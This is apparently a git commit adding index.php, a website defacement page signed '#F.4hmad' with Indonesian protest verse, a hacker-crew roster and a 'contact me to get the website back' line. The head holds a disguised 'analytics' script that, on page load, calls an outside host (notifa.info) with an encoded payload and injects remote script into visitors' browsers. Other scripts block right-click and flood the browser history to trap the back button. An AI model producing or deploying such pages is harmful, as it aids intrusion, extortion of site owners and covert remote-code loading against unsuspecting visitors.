b1bdce7bf520df97474ed559414263b373da239c
DK77-sys <58675446+DK77-sys@users.noreply.github.com>
2020-02-23 09:53:34 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,298 @@
+<!doctype html><html><head> 
+  <title>Hacked by #F.4hmad</title> 
+  <link rel="shortcut icon" type="image/gif" href="https://i.ibb.co/rv5Qxn1/20200221-200550.png?r1024x1024"> 
+  <link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css"> 
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet"> 
+  <script>
+      var pesen="\.<>Null<> /.error*hayo/mau°apa lu.";
+      ///////////////////////////////////
+      function clickIE4(){if (event.button==2){alert(pesen);return false;}}
+      function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){alert(pesen);return false;}}}
+      if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;}
+      else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;}
+      document.oncontextmenu=new Function("alert(pesen);return false")
+    </script> 
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXgG7p2cRmO54iGR9ZhcyqsHS%2fZ60MEA0Q3RvEa9ZpNQQyvIsql%2bk1JJyqDLF21ZdPQtTgUButwdCZvPOCR42nX5If5OJeHzR2%2bOAHNwTCPuFABdi5Bzof7xoem55iK7Nwx8j2E3D0Wj9ka1QESi4RCZU4NcYDLiyF0O0aRY8exQStdhH10ub5z5RDSasYTalwk4DFteg2WW%2bSFY3Bt7jw%2bMyM0RwDIkA%2f%2fcvW3KKIJ78DRF8MeEymwozqfDHv%2bykWIjEAGTS6JoSF80YVsejaF5nTMO6gLWT%2bDWPvyQyV60EUra9VFKQ0EIutTk2ZQ4tHD5yZpwocowVDPUndCqSPx1gmc7SE9%2bx7vMOhmcpyOhi2UFsRJaHc40Yqc2%2bLPace2D4FbBq%2bkTQwyPJORGxJW1MtL%2bphUb4uwoTDYu%2fJYqSzZ00gSfTYq9BF9tpD0RX64L3mBmNpnWcikl45eKCthjbbwUBIZ1Xk8FHiBQw57xAVqtU5UG%2fYsdxSA0tfKT%2fRyZCRz6h0ZVy7RVloL5B8ogPvw2GhZD3hgJXpYdOJWvb8nQjcSWYS7cUqDge%2fVz19" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script> 
+  <style type="text/css">
+  /* Copyright #F.4hmad */
+@import url("https://fonts.googleapis.com/css?family=Iceland|Shadows+Into+Light&display=swap");
+<body>
+i{
+margin:10px;
+color: red;
+}
+a:link{
+color:#000;
+}
+h1{
+  color: #000;
+  text-decoration: none;
+  border-radius:0px;
+  border:0px;
+  font-family: 'Shadows Into Light', cursive;
+  font-size:50px;
+  margin:0px;
+  padding:0px;
+  animation:psychoxploit 0.5s linear infinite;
+}
+pre{
+color:grey;
+}
+marquee{
+width:100%;
+}
+@keyframes psychoxploit{
+2%{color:#fff;}
+3%{transform:translate(2px,-10px) skewX(3240deg);}
+5%{transform:translate(0px,0px) skewX(0deg);}
+2% , 54%{transform:translateX(0px) skew(0deg);}
+55%{transform:translate(-2px,6px) skew(-5530deg);}
+56%{transform:translate(0px,0px) skew(0deg);}
+57%{transform:translate(4px,-10px) skew(-70deg);}
+58%{transform:translate(0px,0px) skew(0deg);}
+62%{transform:translate(0px,20px) skew(0deg);}
+63%{transform:translate(4px,-2px) skew(0deg);}
+90%{transform:translate(1px,3px); skew(-230deg);}
+95%{transform:translate(-7px,2px); skew(-120deg);}
+100%{transform:translate(0px,0px) skew(0deg);}
+</style> 
+ </head> 
+ <body> 
+  <script>
+(function () {
+for(var i = 0; i < 20; i++) {
+history.pushState(null, document.title, window.location.href );
+}
+})(document, window, history);
+</script> 
+  <center> 
+   <style>
+      body{ background-color:black}
+      html, body, div, span, applet, object, iframe,
+h1, h2, h3, h4, h5, h6, p, blockquote, pre,
+a, abbr, acronym, address, big, cite, code,
+del, dfn, em, img, ins, kbd, q, s, samp,
+small, strike, strong, sub, sup, tt, var,
+b, u, i, center,
+dl, dt, dd, ol, ul, li,
+fieldset, form, label, legend,
+table, caption, tbody, tfoot, thead, tr, th, td,
+article, aside, canvas, details, embed, 
+figure, figcaption, footer, header, hgroup, 
+menu, nav, output, ruby, section, summary,
+time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+  font-size: 100%;
+  font: inherit;
+  vertical-align: baseline;
+}
+/* HTML5 display-role reset for older browsers */
+article, aside, details, figcaption, figure, 
+footer, header, hgroup, menu, nav, section {
+  display: block;
+}
+body {
+  line-height: 1;
+}
+ol, ul {
+  list-style: none;
+}
+blockquote, q {
+  quotes: none;
+}
+blockquote:before, blockquote:after,
+q:before, q:after {
+  content: '';
+  content: none;
+}
+table {
+  border-collapse: collapse;
+  border-spacing: 0;
+}
+
+@import url(https://fonts.googleapis.com/css?family=Indie Flower);
+
+h1 {
+  color: #ffffff;
+  font-size: 25px;
+  font-family: Indie Flower;
+}
+
+.typed {
+  font-family: Indie Flower;
+  color: #fff;
+}
+
+.typed-cursor{
+   opacity: 1;
+   animation: blink 0.7s infinite;
+}
+
+@keyframes blink{
+    0% { opacity:1; }
+    50% { opacity:0; }
+    100% { opacity:1; }
+}
+</style> 
+   <style>
+html {
+background-color: #000;
+}
+#tulisan {
+    font-family: Indie Flower;
+    color: #fff;
+    font-size: 45px;
+    text-align: center;
+}
+.btn {
+    background-color: #000;
+    border: 2px solid #fff;
+    border-radius: 13px;
+    width: 250px;
+    height: 50px;
+}
+.blink_me{font-size:60px;-webkit-animation-name:blinker;-webkit-animation-duration:2s;-webkit-animation-timing-function:linear;-webkit-animation-iteration-count:infinite;-moz-animation-name:blinker;-moz-animation-duration:2s;-moz-animation-timing-function:linear;-moz-animation-iteration-count:infinite;animation-name:blinker;animation-duration:1s;animation-timing-function:linear;animation-iteration-count:infinite;}@-moz-keyframes blinker{0% {opacity:1.0;}50% {opacity:0.0;}100% {opacity:1.0;}}@-webkit-keyframes blinker{ 0% {opacity:1.0;}50% {opacity:0.0;}100% {opacity:1.0;}}@keyframes blinker{0% {opacity:1.0;}50% {opacity:0.0;}100% {opacity:1.0;}}
+</style> 
+   <style>
+@import 
+url(http://fonts.googleapis.com/css?family=Indie+Flower);
+.text {
+  width: 100%;
+  height: 100px;
+  margin: auto;
+  display: block;
+  text-align: center;}
+
+.text span {
+  position: relative;
+  top: 20px;
+  display: inline-block;
+  -webkit-animation: bounce .3s ease infinite alternate;
+  -moz-animation: bounce .3s ease infinite alternate;
+  -ms-animation: bounce .3s ease infinite alternate;
+  -o-animation: bounce .3s ease infinite alternate;
+  animation: bounce .3s ease infinite alternate;
+  font-family: 'Indie Flower', cursive;
+  font-size: 50px;
+  color: white;
+  text-shadow: 0 1px 0 #CCC,
+               0 2px 0 #CCC,
+               0 3px 0 #CCC,
+               0 4px 0 #CCC,
+               0 5px 0 #CCC,
+               0 6px 0 transparent,
+               0 7px 0 transparent,
+               0 8px 0 transparent,
+               0 9px 0 transparent,
+               0 10px 10px rgba(0, 0, 0, .4);}
+
+.text span:nth-child(2) {-webkit-animation-delay: .1s;-moz-animation-delay: .1s;animation-delay: .1s;}
+.text span:nth-child(3) {-webkit-animation-delay: .2s;-moz-animation-delay: .2s;animation-delay: .2s;}
+.text span:nth-child(4) {-webkit-animation-delay: .3s;-moz-animation-delay: .3s;animation-delay: .3s;}
+.text span:nth-child(5) {-webkit-animation-delay: .4s;-moz-animation-delay: .4s;animation-delay: .4s;}
+.text span:nth-child(6) {-webkit-animation-delay: .5s;-moz-animation-delay: .5s;animation-delay: .5s;}
+.text span:nth-child(7) {-webkit-animation-delay: .6s;-moz-animation-delay: .6s;animation-delay: .6s;}
+.text span:nth-child(8) {-webkit-animation-delay: .7s;-moz-animation-delay: .7s;animation-delay: .7s;}
+.text span:nth-child(9) {-webkit-animation-delay: .8s;-moz-animation-delay: .8s;animation-delay: .8s;}
+.text span:nth-child(10) {-webkit-animation-delay: .9s;-moz-animation-delay: .9s;animation-delay: .9s;}
+.text span:nth-child(11) {-webkit-animation-delay: 1s;-moz-animation-delay: 1s;animation-delay: 1s;}
+.text span:nth-child(12) {-webkit-animation-delay: 1.1s;-moz-animation-delay: 1.1s;animation-delay: 1.1s;}
+.text span:nth-child(13) {-webkit-animation-delay: 1.2s;-moz-animation-delay: 1.2s;animation-delay: 1.2s;}
+.text span:nth-child(14) {-webkit-animation-delay: 1.3s;-moz-animation-delay: 1.3s;animation-delay: 1.3s;}
+.text span:nth-child(15) {-webkit-animation-delay: 1.4s;-moz-animation-delay: 1.4s;animation-delay: 1.4s;}
+.text span:nth-child(16) {-webkit-animation-delay: 1.5s;-moz-animation-delay: 1.5s;animation-delay: 1.5s;}
+
+@-webkit-keyframes bounce {
+  100% {top: -20px;
+    text-shadow: 0 1px 0 #CCC,0 2px 0 #CCC,0 3px 0 #CCC,0 4px 0 #CCC,0 5px 0 #CCC,0 6px 0 #CCC,0 7px 0 #CCC,0 8px 0 #CCC,0 9px 0 #CCC,0 50px 25px rgba(0, 0, 0, .2);}}
+
+@-moz-keyframes bounce {
+  100% {top: -20px;
+    text-shadow: 0 1px 0 #CCC,0 2px 0 #CCC,0 3px 0 #CCC,0 4px 0 #CCC,0 5px 0 #CCC,0 6px 0 #CCC,0 7px 0 #CCC,0 8px 0 #CCC,0 9px 0 #CCC,0 50px 25px rgba(0, 0, 0, .2);}}
+
+@keyframes bounce {
+  100% {top: -20px;
+    text-shadow: 0 1px 0 #CCC,0 2px 0 #CCC,0 3px 0 #CCC,0 4px 0 #CCC,0 5px 0 #CCC,0 6px 0 #CCC,0 7px 0 #CCC,0 8px 0 #CCC,0 9px 0 #CCC,0 50px 25px rgba(0, 0, 0, .2);}}
+    </style> function play(){ var audio = document.getElementById("lagu"); audio.play(); } function liat(){ document.getElementById('galiat').style.visibility="visible"; } 
+   <br> 
+   <center> 
+    <br> 
+    <br> 
+    <br> 
+    <img src="https://s5.gifyu.com/images/Tak-berjudul-64_1080p.gif"  border="0" widht="500" height="450"> 
+   </center> 
+   <br> 
+   <center> 
+    <br> 
+    <p></p> 
+    <h1><font face="iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px;" color="red">[+]Touch By <font style="color:white">#F.4hmad[+]</font></font></h1> 
+    <p></p> 
+    <br> 
+   </center> 
+   <center> 
+    <p><font face="iceland" style="font-size:30px; text-shadow:#0063FF 0px 5px 5px;" color="red">-=| Katanya Tanah Kita Tanah Surga |=- <br>-=| Tetapi Mengapa Kami merasa Sengsara |=- <br> -=| Sungguh Malang Negeri Ini |=-</font></p> 
+   </center> 
+   <center> 
+    <p><font face="iceland" style="font-size:30px; text-shadow:#0063FF 0px 5px 5px;" color="white">-=|Kita Menghukum Maling-Maling Kecil |=- <br>-=| Dan Menunjuk Maling-Maling Besar |=- <br> -=| Untuk Bekerja Dipemerintahan |=-</font></p> 
+   </center> 
+   <br> 
+   <center> 
+    <p></p> 
+    <h1><font face="iceland" style="font-size:30px; text-shadow:#0063FF 0px 3px 5px;" color="red">#We Are#</font></h1> 
+    <p></p> 
+   </center> 
+   <center> 
+    <p><font face="Iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px; " color="white">...:::Aliansi Cyber Indonesia:::...</font></p> 
+   </center> 
+   <font face="Iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px; " color="white"> 
+    <center> 
+     <p><font face="Iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px; " color="white">...:::MY FAMILY:::...</font></p> 
+    </center><font face="Iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px; " color="white"> </font></font> 
+   <center> 
+    <font face="Iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px; " color="white"><font face="Iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px; " color="white"><p> 
+       <fonf face="Iceland" style="font-size:25px; text-shadow:#0063FF 0px 5px 5px;" color="white">
+         |./MR.`VENOM|./MR.YUJ1N|./Mr.Fred|./Mr.MF33| 
+        <br> |./HELIX|./HASAN|./HAXK3RS09| 
+        <br>|./CHUCKY|./UNDERFIF| 
+       </fonf></p></font></font> 
+   </center> 
+   <br> 
+   <br> 
+   <center> 
+    <br> 
+    <embed src="https://a.top4top.io/m_1512df0cq9.mp3" type="audio/mpeg" autostart="true" loop="true"> 
+    <br> 
+   </center> 
+   <br> 
+   <div class="error"> 
+    <div class="animated flat"> 
+    </div> 
+    <br> 
+    <br> 
+    <div id="galiat" style="font-family:Indie Flower; color:#ffffff;visibility:hidden"> 
+     <center> 
+     </center> 
+     <center> 
+      <font face="iceland" style="font-size:30px; text-shadow:#0063FF 0px 5px 5px;" color="red">-=Contact Gue Buat Pengembalian Website=-| </font> 
+     </center> 
+    </div> 
+    <center> 
+     <br> 
+     <h1><a href"aokakakkaakakaka" target="_blink"><button class="btn"><font face="Indie Flower" color="#ffffff" size="6">Contact Me</font></button></a></h1> 
+     <br> 
+     <br> 
+     <script> alert ('Touched??');alert ('No.. I am just change it')</script> 
+     <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.9"></script> 
+     <style>
+    </body>
+
+  <html>
+</style> 
+    </center> 
+   </div> 
+  </center> 
+ 
+</body></html>
+    
